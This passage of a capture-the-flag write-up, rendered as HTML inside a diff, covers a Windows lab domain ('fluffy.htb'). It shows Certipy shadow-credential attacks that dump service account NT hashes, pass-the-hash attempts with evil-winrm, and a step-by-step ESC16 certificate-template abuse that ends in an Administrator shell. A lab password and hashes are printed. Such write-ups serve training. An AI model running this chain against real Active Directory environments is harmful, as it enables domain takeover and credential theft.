+</span></span><span class="line"><span class="cl">[*] Got TGT
+</span></span><span class="line"><span class="cl">[*] Saving credential cache to &#39;ca_svc.ccache&#39;
+</span></span><span class="line"><span class="cl">[*] Wrote credential cache to &#39;ca_svc.ccache&#39;
+</span></span><span class="line"><span class="cl">[*] Trying to retrieve NT hash for &#39;ca_svc&#39;
+</span></span><span class="line"><span class="cl">[*] Restoring the old Key Credentials for &#39;ca_svc&#39;
+</span></span><span class="line"><span class="cl">[*] Successfully restored the old Key Credentials for &#39;ca_svc&#39;
+</span></span><span class="line"><span class="cl">[*] NT hash for &#39;ca_svc&#39;: ca0f4f9e9eb8a092addf53bb03fc98c8
+</span></span></code></pre></div><p>Got this hash <code>ca0f4f9e9eb8a092addf53bb03fc98c8</code></p>
+<p>will try this using <code>evil-winrm</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(work)─(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ evil-winrm -i 10.10.11.69 -u &#34;CA_SVC&#34; -H &#34;ca0f4f9e9eb8a092addf53bb03fc98c8&#34; 
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.7
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl">Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl">Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl">Error: Exiting with code 1
+</span></span></code></pre></div><p><strong>The NTLM hash is valid, but the user doesn&rsquo;t have WinRM access</strong> on the target <strong><code>10.10.11.69</code></strong>.</p>
+<h2 id="ldap_svc"><code>LDAP_SVC</code></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(work)─(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ certipy-ad shadow auto -u &#39;p.agila@fluffy.htb&#39; -p &#39;prometheusx-303&#39; -account &#39;LDAP_SVC&#39; -target &#39;10.10.11.69&#39; -dc-ip 10.10.11.69
+</span></span><span class="line"><span class="cl">Certipy v5.0.2 - by Oliver Lyak (ly4k)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Targeting user &#39;ldap_svc&#39;
+</span></span><span class="line"><span class="cl">[*] Generating certificate
+</span></span><span class="line"><span class="cl">[*] Certificate generated
+</span></span><span class="line"><span class="cl">[*] Generating Key Credential
+</span></span><span class="line"><span class="cl">[*] Key Credential generated with DeviceID &#39;dd40a5dd-1c01-178a-9331-dd30cfd824cf&#39;
+</span></span><span class="line"><span class="cl">[*] Adding Key Credential with device ID &#39;dd40a5dd-1c01-178a-9331-dd30cfd824cf&#39; to the Key Credentials for &#39;ldap_svc&#39;
+</span></span><span class="line"><span class="cl">[*] Successfully added Key Credential with device ID &#39;dd40a5dd-1c01-178a-9331-dd30cfd824cf&#39; to the Key Credentials for &#39;ldap_svc&#39;
+</span></span><span class="line"><span class="cl">[*] Authenticating as &#39;ldap_svc&#39; with the certificate
+</span></span><span class="line"><span class="cl">[*] Certificate identities:
+</span></span><span class="line"><span class="cl">[*]     No identities found in this certificate
+</span></span><span class="line"><span class="cl">[*] Using principal: &#39;ldap_svc@fluffy.htb&#39;
+</span></span><span class="line"><span class="cl">[*] Trying to get TGT...
+</span></span><span class="line"><span class="cl">[*] Got TGT
+</span></span><span class="line"><span class="cl">[*] Saving credential cache to &#39;ldap_svc.ccache&#39;
+</span></span><span class="line"><span class="cl">[*] Wrote credential cache to &#39;ldap_svc.ccache&#39;
+</span></span><span class="line"><span class="cl">[*] Trying to retrieve NT hash for &#39;ldap_svc&#39;
+</span></span><span class="line"><span class="cl">[*] Restoring the old Key Credentials for &#39;ldap_svc&#39;
+</span></span><span class="line"><span class="cl">[*] Successfully restored the old Key Credentials for &#39;ldap_svc&#39;
+</span></span><span class="line"><span class="cl">[*] NT hash for &#39;ldap_svc&#39;: 22151d74ba3de931a352cba1f9393a37
+</span></span></code></pre></div><p>got this hash <code>22151d74ba3de931a352cba1f9393a37</code></p>
+<p>After failing to get remote access to other objects I looked for vulnerable templates</p>
+<h3 id="winrm_svcfluffyhtb"><code>WINRM_SVC@FLUFFY.HTB</code></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(work)─(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ certipy find -u &#39;WINRM_SVC@FLUFFY.HTB&#39; -hashes &#34;33bd09dcd697600edf6b3a7af4875767&#34; -dc-ip 10.10.11.69 -vulnerable -enabled
+</span></span><span class="line"><span class="cl">Certipy v5.0.3 - by Oliver Lyak (ly4k)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Finding certificate templates
+</span></span><span class="line"><span class="cl">[*] Found 33 certificate templates
+</span></span><span class="line"><span class="cl">[*] Finding certificate authorities
+</span></span><span class="line"><span class="cl">[*] Found 1 certificate authority
+</span></span><span class="line"><span class="cl">[*] Found 11 enabled certificate templates
+</span></span><span class="line"><span class="cl">[*] Finding issuance policies
+</span></span><span class="line"><span class="cl">[*] Found 14 issuance policies
+</span></span><span class="line"><span class="cl">[*] Found 0 OIDs linked to templates
+</span></span><span class="line"><span class="cl">[*] Retrieving CA configuration for &#39;fluffy-DC01-CA&#39; via RRP
+</span></span><span class="line"><span class="cl">[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+</span></span><span class="line"><span class="cl">[*] Successfully retrieved CA configuration for &#39;fluffy-DC01-CA&#39;
+</span></span><span class="line"><span class="cl">[*] Checking web enrollment for CA &#39;fluffy-DC01-CA&#39; @ &#39;DC01.fluffy.htb&#39;
+</span></span><span class="line"><span class="cl">[!] Error checking web enrollment: timed out
+</span></span><span class="line"><span class="cl">[!] Use -debug to print a stacktrace
+</span></span><span class="line"><span class="cl">[!] Error checking web enrollment: timed out
+</span></span><span class="line"><span class="cl">[!] Use -debug to print a stacktrace
+</span></span><span class="line"><span class="cl">[*] Saving text output to &#39;20250709132641_Certipy.txt&#39;
+</span></span><span class="line"><span class="cl">[*] Wrote text output to &#39;20250709132641_Certipy.txt&#39;
+</span></span><span class="line"><span class="cl">[*] Saving JSON output to &#39;20250709132641_Certipy.json&#39;
+</span></span><span class="line"><span class="cl">[*] Wrote JSON output to &#39;20250709132641_Certipy.json&#39;
+</span></span><span class="line"><span class="cl">                                                                                                                                                             
+</span></span><span class="line"><span class="cl">┌──(work)─(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ cat 20250709132641_Certipy.txt 
+</span></span><span class="line"><span class="cl">Certificate Authorities
+</span></span><span class="line"><span class="cl">  0
+</span></span><span class="line"><span class="cl">    CA Name                             : fluffy-DC01-CA
+</span></span><span class="line"><span class="cl">    DNS Name                            : DC01.fluffy.htb
+</span></span><span class="line"><span class="cl">    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
+</span></span><span class="line"><span class="cl">    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
+</span></span><span class="line"><span class="cl">    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
+</span></span><span class="line"><span class="cl">    Certificate Validity End            : 3024-04-17 16:11:16+00:00
+</span></span><span class="line"><span class="cl">    Web Enrollment
+</span></span><span class="line"><span class="cl">      HTTP
+</span></span><span class="line"><span class="cl">        Enabled                         : False
+</span></span><span class="line"><span class="cl">      HTTPS
+</span></span><span class="line"><span class="cl">        Enabled                         : False
+</span></span><span class="line"><span class="cl">    User Specified SAN                  : Disabled
+</span></span><span class="line"><span class="cl">    Request Disposition                 : Issue
+</span></span><span class="line"><span class="cl">    Enforce Encryption for Requests     : Enabled
+</span></span><span class="line"><span class="cl">    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+</span></span><span class="line"><span class="cl">    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
+</span></span><span class="line"><span class="cl">    Permissions
+</span></span><span class="line"><span class="cl">      Owner                             : FLUFFY.HTB\Administrators
+</span></span><span class="line"><span class="cl">      Access Rights
+</span></span><span class="line"><span class="cl">        ManageCa                        : FLUFFY.HTB\Domain Admins
+</span></span><span class="line"><span class="cl">                                          FLUFFY.HTB\Enterprise Admins
+</span></span><span class="line"><span class="cl">                                          FLUFFY.HTB\Administrators
+</span></span><span class="line"><span class="cl">        ManageCertificates              : FLUFFY.HTB\Domain Admins
+</span></span><span class="line"><span class="cl">                                          FLUFFY.HTB\Enterprise Admins
+</span></span><span class="line"><span class="cl">                                          FLUFFY.HTB\Administrators
+</span></span><span class="line"><span class="cl">        Enroll                          : FLUFFY.HTB\Cert Publishers
+</span></span><span class="line"><span class="cl">Certificate Templates                   : [!] Could not find any certificate templates
+</span></span></code></pre></div><p>But found no vulnerability so i looked for the vulnerable templates in CA_SVC</p>
+<h3 id="ca_svcfluffyhtb"><code>CA_SVC@FLUFFY.HTB</code></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(work)─(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ certipy find -u &#39;ca_SVC@FLUFFY.HTB&#39; -hashes &#34;ca0f4f9e9eb8a092addf53bb03fc98c8&#34; -dc-ip 10.10.11.69 -vulnerable -enabled
+</span></span><span class="line"><span class="cl">Certipy v5.0.3 - by Oliver Lyak (ly4k)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Finding certificate templates
+</span></span><span class="line"><span class="cl">[*] Found 33 certificate templates
+</span></span><span class="line"><span class="cl">[*] Finding certificate authorities
+</span></span><span class="line"><span class="cl">[*] Found 1 certificate authority
+</span></span><span class="line"><span class="cl">[*] Found 11 enabled certificate templates
+</span></span><span class="line"><span class="cl">[*] Finding issuance policies
+</span></span><span class="line"><span class="cl">[*] Found 14 issuance policies
+</span></span><span class="line"><span class="cl">[*] Found 0 OIDs linked to templates
+</span></span><span class="line"><span class="cl">[*] Retrieving CA configuration for &#39;fluffy-DC01-CA&#39; via RRP
+</span></span><span class="line"><span class="cl">[*] Successfully retrieved CA configuration for &#39;fluffy-DC01-CA&#39;
+</span></span><span class="line"><span class="cl">[*] Checking web enrollment for CA &#39;fluffy-DC01-CA&#39; @ &#39;DC01.fluffy.htb&#39;
+</span></span><span class="line"><span class="cl">[!] Error checking web enrollment: timed out
+</span></span><span class="line"><span class="cl">[!] Use -debug to print a stacktrace
+</span></span><span class="line"><span class="cl">[!] Error checking web enrollment: timed out
+</span></span><span class="line"><span class="cl">[!] Use -debug to print a stacktrace
+</span></span><span class="line"><span class="cl">[*] Saving text output to &#39;20250709132840_Certipy.txt&#39;
+</span></span><span class="line"><span class="cl">[*] Wrote text output to &#39;20250709132840_Certipy.txt&#39;
+</span></span><span class="line"><span class="cl">[*] Saving JSON output to &#39;20250709132840_Certipy.json&#39;
+</span></span><span class="line"><span class="cl">[*] Wrote JSON output to &#39;20250709132840_Certipy.json&#39;
+</span></span><span class="line"><span class="cl">                                                                                                                                                             
+</span></span><span class="line"><span class="cl">                                                                                                                                                                                                                                                                                                                       
+</span></span><span class="line"><span class="cl">┌──(work)─(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ cat 20250709132840_Certipy.json                                                                                       
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">  &#34;Certificate Authorities&#34;: {
+</span></span><span class="line"><span class="cl">    &#34;0&#34;: {
+</span></span><span class="line"><span class="cl">      &#34;CA Name&#34;: &#34;fluffy-DC01-CA&#34;,
+</span></span><span class="line"><span class="cl">      &#34;DNS Name&#34;: &#34;DC01.fluffy.htb&#34;,
+</span></span><span class="line"><span class="cl">      &#34;Certificate Subject&#34;: &#34;CN=fluffy-DC01-CA, DC=fluffy, DC=htb&#34;,
+</span></span><span class="line"><span class="cl">      &#34;Certificate Serial Number&#34;: &#34;3670C4A715B864BB497F7CD72119B6F5&#34;,
+</span></span><span class="line"><span class="cl">      &#34;Certificate Validity Start&#34;: &#34;2025-04-17 16:00:16+00:00&#34;,
+</span></span><span class="line"><span class="cl">      &#34;Certificate Validity End&#34;: &#34;3024-04-17 16:11:16+00:00&#34;,
+</span></span><span class="line"><span class="cl">      &#34;Web Enrollment&#34;: {
+</span></span><span class="line"><span class="cl">        &#34;http&#34;: {
+</span></span><span class="line"><span class="cl">          &#34;enabled&#34;: false
+</span></span><span class="line"><span class="cl">        },
+</span></span><span class="line"><span class="cl">        &#34;https&#34;: {
+</span></span><span class="line"><span class="cl">          &#34;enabled&#34;: false,
+</span></span><span class="line"><span class="cl">          &#34;channel_binding&#34;: null
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">      },
+</span></span><span class="line"><span class="cl">      &#34;User Specified SAN&#34;: &#34;Disabled&#34;,
+</span></span><span class="line"><span class="cl">      &#34;Request Disposition&#34;: &#34;Issue&#34;,
+</span></span><span class="line"><span class="cl">      &#34;Enforce Encryption for Requests&#34;: &#34;Enabled&#34;,
+</span></span><span class="line"><span class="cl">      &#34;Active Policy&#34;: &#34;CertificateAuthority_MicrosoftDefault.Policy&#34;,
+</span></span><span class="line"><span class="cl">      &#34;Disabled Extensions&#34;: [
+</span></span><span class="line"><span class="cl">        &#34;1.3.6.1.4.1.311.25.2&#34;
+</span></span><span class="line"><span class="cl">      ],
+</span></span><span class="line"><span class="cl">      &#34;Permissions&#34;: {
+</span></span><span class="line"><span class="cl">        &#34;Owner&#34;: &#34;FLUFFY.HTB\\Administrators&#34;,
+</span></span><span class="line"><span class="cl">        &#34;Access Rights&#34;: {
+</span></span><span class="line"><span class="cl">          &#34;1&#34;: [
+</span></span><span class="line"><span class="cl">            &#34;FLUFFY.HTB\\Domain Admins&#34;,
+</span></span><span class="line"><span class="cl">            &#34;FLUFFY.HTB\\Enterprise Admins&#34;,
+</span></span><span class="line"><span class="cl">            &#34;FLUFFY.HTB\\Administrators&#34;
+</span></span><span class="line"><span class="cl">          ],
+</span></span><span class="line"><span class="cl">          &#34;2&#34;: [
+</span></span><span class="line"><span class="cl">            &#34;FLUFFY.HTB\\Domain Admins&#34;,
+</span></span><span class="line"><span class="cl">            &#34;FLUFFY.HTB\\Enterprise Admins&#34;,
+</span></span><span class="line"><span class="cl">            &#34;FLUFFY.HTB\\Administrators&#34;
+</span></span><span class="line"><span class="cl">          ],
+</span></span><span class="line"><span class="cl">          &#34;512&#34;: [
+</span></span><span class="line"><span class="cl">            &#34;FLUFFY.HTB\\Cert Publishers&#34;
+</span></span><span class="line"><span class="cl">          ]
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">      },
+</span></span><span class="line"><span class="cl">      &#34;[!] Vulnerabilities&#34;: {
+</span></span><span class="line"><span class="cl">        &#34;ESC16&#34;: &#34;Security Extension is disabled.&#34;
+</span></span><span class="line"><span class="cl">      },
+</span></span><span class="line"><span class="cl">      &#34;[*] Remarks&#34;: {
+</span></span><span class="line"><span class="cl">        &#34;ESC16&#34;: &#34;Other prerequisites may be required for this to be exploitable. See the wiki for more details.&#34;
+</span></span><span class="line"><span class="cl">      }
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">  },
+</span></span><span class="line"><span class="cl">  &#34;Certificate Templates&#34;: &#34;[!] Could not find any certificate templates&#34;
+</span></span><span class="line"><span class="cl">}                                                                                                                                                             
+</span></span></code></pre></div><p>Fortunately it has  <code>&quot;ESC16&quot;: &quot;Security Extension is disabled.&quot;</code></p>
+<p>Now I looked into  <code>&quot;ESC16&quot;: &quot;Security Extension is disabled&quot;</code> to understand what is it and how can it be exploited.</p>
+<h2 id="esc16-security-extension-is-disabled"><strong><code>&quot;ESC16&quot;: &quot;Security Extension is disabled.&quot;</code></strong></h2>
+<p><code>Attacker = p.agila</code></p>
+<p><code>Victim = CA_SVC</code></p>
+<p>The exploitation mechanisms for ESC16 are identical to those for ESC9 because the end result - a certificate lacking the SID security extension - is the same. The important difference is that for ESC16, <em>any</em> certificate template enabling client authentication and issued by this misconfigured CA can be used in the UPN manipulation attack, not just a template specifically flagged with <code>CT_FLAG_NO_SECURITY_EXTENSION</code>.</p>
+<ul>
+<li>
+<p><strong>Step 1: Read initial UPN of the victim account (Optional - for restoration)</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>work<span class="o">)</span>─<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ certipy account -u <span class="s1">&#39;ca_SVC@FLUFFY.HTB&#39;</span> -hashes <span class="s2">&#34;ca0f4f9e9eb8a092addf53bb03fc98c8&#34;</span> -dc-ip <span class="s1">&#39;10.10.11.69&#39;</span> -user <span class="s1">&#39;administrator&#39;</span> <span class="nb">read</span>           
+</span></span><span class="line"><span class="cl">Certipy v5.0.3 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Reading attributes <span class="k">for</span> <span class="s1">&#39;Administrator&#39;</span>:
+</span></span><span class="line"><span class="cl">    cn                                  : Administrator
+</span></span><span class="line"><span class="cl">    distinguishedName                   : <span class="nv">CN</span><span class="o">=</span>Administrator,CN<span class="o">=</span>Users,DC<span class="o">=</span>fluffy,DC<span class="o">=</span>htb
+</span></span><span class="line"><span class="cl">    name                                : Administrator
+</span></span><span class="line"><span class="cl">    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-500
+</span></span><span class="line"><span class="cl">    sAMAccountName                      : Administrator
+</span></span><span class="line"><span class="cl">    userAccountControl                  : <span class="m">66048</span>
+</span></span><span class="line"><span class="cl">    whenCreated                         : 2025-04-17T15:59:25+00:00
+</span></span><span class="line"><span class="cl">    whenChanged                         : 2025-07-09T18:17:16+00:00
+</span></span></code></pre></div></li>
+<li>
+<p><strong>Step 2: Update the victim account&rsquo;s UPN to the target administrator&rsquo;s <code>sAMAccountName</code>.</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>work<span class="o">)</span>─<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ certipy-ad account -u <span class="s1">&#39;p.agila&#39;</span> -p <span class="s1">&#39;prometheusx-303&#39;</span> -dc-ip <span class="s1">&#39;10.10.11.69&#39;</span> -upn <span class="s1">&#39;administrator@fluffy.htb&#39;</span>  -user <span class="s1">&#39;ca_svc&#39;</span> update
+</span></span><span class="line"><span class="cl">Certipy v5.0.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Updating user <span class="s1">&#39;ca_svc&#39;</span>:
+</span></span><span class="line"><span class="cl">    userPrincipalName                   : administrator@fluffy.htb
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Successfully updated <span class="s1">&#39;ca_svc&#39;</span>
+</span></span></code></pre></div></li>
+<li>
+<p><strong>Step 3: (If needed) Obtain credentials for the &ldquo;victim&rdquo; account (e.g., via Shadow Credentials).</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(work)─(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ certipy shadow -u &#39;p.agila&#39; -p &#39;prometheusx-303&#39; -dc-ip &#39;10.10.11.69&#39; -account &#39;ca_svc&#39; auto
+</span></span><span class="line"><span class="cl">Certipy v5.0.3 - by Oliver Lyak (ly4k)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Targeting user &#39;ca_svc&#39;
+</span></span><span class="line"><span class="cl">[*] Generating certificate
+</span></span><span class="line"><span class="cl">[*] Certificate generated
+</span></span><span class="line"><span class="cl">[*] Generating Key Credential
+</span></span><span class="line"><span class="cl">[*] Key Credential generated with DeviceID &#39;405ee41ddaf34df4b41be0a6da85b599&#39;
+</span></span><span class="line"><span class="cl">[*] Adding Key Credential with device ID &#39;405ee41ddaf34df4b41be0a6da85b599&#39; to the Key Credentials for &#39;ca_svc&#39;
+</span></span><span class="line"><span class="cl">[*] Successfully added Key Credential with device ID &#39;405ee41ddaf34df4b41be0a6da85b599&#39; to the Key Credentials for &#39;ca_svc&#39;
+</span></span><span class="line"><span class="cl">[*] Authenticating as &#39;ca_svc&#39; with the certificate
+</span></span><span class="line"><span class="cl">[*] Certificate identities:
+</span></span><span class="line"><span class="cl">[*]     No identities found in this certificate
+</span></span><span class="line"><span class="cl">[*] Using principal: &#39;ca_svc@fluffy.htb&#39;
+</span></span><span class="line"><span class="cl">[*] Trying to get TGT...
+</span></span><span class="line"><span class="cl">[*] Got TGT
+</span></span><span class="line"><span class="cl">[*] Saving credential cache to &#39;ca_svc.ccache&#39;
+</span></span><span class="line"><span class="cl">File &#39;ca_svc.ccache&#39; already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+</span></span><span class="line"><span class="cl">[*] Wrote credential cache to &#39;ca_svc.ccache&#39;
+</span></span><span class="line"><span class="cl">[*] Trying to retrieve NT hash for &#39;ca_svc&#39;
+</span></span><span class="line"><span class="cl">[*] Restoring the old Key Credentials for &#39;ca_svc&#39;
+</span></span><span class="line"><span class="cl">[*] Successfully restored the old Key Credentials for &#39;ca_svc&#39;
+</span></span><span class="line"><span class="cl">[*] NT hash for &#39;ca_svc&#39;: ca0f4f9e9eb8a092addf53bb03fc98c8
+</span></span></code></pre></div><p>NT hash = <code>ca0f4f9e9eb8a092addf53bb03fc98c8</code></p>
+</li>
+<li>
+<p><strong>Step 4: Request a certificate as the &ldquo;victim&rdquo; user from <em>any suitable client authentication template</em> (e.g., &ldquo;User&rdquo;) on the ESC16-vulnerable CA.</strong> Because the CA is vulnerable to ESC16, it will automatically omit the SID security extension from the issued certificate, regardless of the template&rsquo;s specific settings for this extension. Set the Kerberos credential cache environment variable (shell command):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>work<span class="o">)</span>─<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>ca_svc.ccache
+</span></span></code></pre></div></li>
+<li>
+<p>Then request the certificate:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>work<span class="o">)</span>─<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ certipy-ad  req -k -dc-ip 10.10.11.69 -target <span class="s1">&#39;DC01.FLUFFY.HTB&#39;</span> -ca <span class="s1">&#39;FLUFFY-DC01-CA&#39;</span> -template <span class="s1">&#39;User&#39;</span>
+</span></span><span class="line"><span class="cl">Certipy v5.0.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> DC host <span class="o">(</span>-dc-host<span class="o">)</span> not specified and Kerberos authentication is used. This might fail
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting certificate via RPC
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Request ID is <span class="m">16</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Successfully requested certificate
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got certificate with UPN <span class="s1">&#39;administrator@fluffy.htb&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Certificate has no object SID
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Try using -sid to <span class="nb">set</span> the object SID or see the wiki <span class="k">for</span> more details
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving certificate and private key to <span class="s1">&#39;administrator.pfx&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Wrote certificate and private key to <span class="s1">&#39;administrator.pfx&#39;</span>
+</span></span></code></pre></div></li>
+<li>
+<p><strong>Step 5: Revert the &ldquo;victim&rdquo; account&rsquo;s UPN.</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>work<span class="o">)</span>─<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ certipy-ad account -u <span class="s1">&#39;p.agila&#39;</span> -p <span class="s1">&#39;prometheusx-303&#39;</span> -dc-ip <span class="s1">&#39;10.10.11.69&#39;</span> -upn <span class="s1">&#39;ca_svc@fluffy.htb&#39;</span> -user <span class="s1">&#39;ca_svc&#39;</span> update
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Certipy v5.0.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Updating user <span class="s1">&#39;ca_svc&#39;</span>:
+</span></span><span class="line"><span class="cl">    userPrincipalName                   : ca_svc@fluffy.htb
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Successfully updated <span class="s1">&#39;ca_svc&#39;</span>
+</span></span></code></pre></div></li>
+<li>
+<p><strong>Step 6: Authenticate as the target administrator.</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>work<span class="o">)</span>─<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ certipy auth -pfx <span class="s1">&#39;administrator.pfx&#39;</span> -dc-ip <span class="s1">&#39;10.10.11.69&#39;</span> -username <span class="s1">&#39;administrator&#39;</span> -domain <span class="s1">&#39;fluffy.htb&#39;</span>
+</span></span><span class="line"><span class="cl">Certipy v5.0.3 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Certificate identities:
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>     SAN UPN: <span class="s1">&#39;administrator@fluffy.htb&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using principal: <span class="s1">&#39;administrator@fluffy.htb&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to get TGT...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got TGT
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving credential cache to <span class="s1">&#39;administrator.ccache&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Wrote credential cache to <span class="s1">&#39;administrator.ccache&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to retrieve NT <span class="nb">hash</span> <span class="k">for</span> <span class="s1">&#39;administrator&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got <span class="nb">hash</span> <span class="k">for</span> <span class="s1">&#39;administrator@fluffy.htb&#39;</span>: aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
+</span></span></code></pre></div><p>administrator hash <code>ad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e</code></p>
+</li>
+</ul>
+<h2 id="administrator-access">Administrator Access:</h2>
+<p>Using e<code>vil-winrm</code>  i got the shell of <code>Administrator</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>work<span class="o">)</span>─<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ evil-winrm -i 10.10.11.69 -u <span class="s1">&#39;Administrator&#39;</span> -H <span class="s1">&#39;8da83a3fa618b6e3a00e93f676c92a6e&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.7
+</span></span><span class="line"><span class="cl">                                        
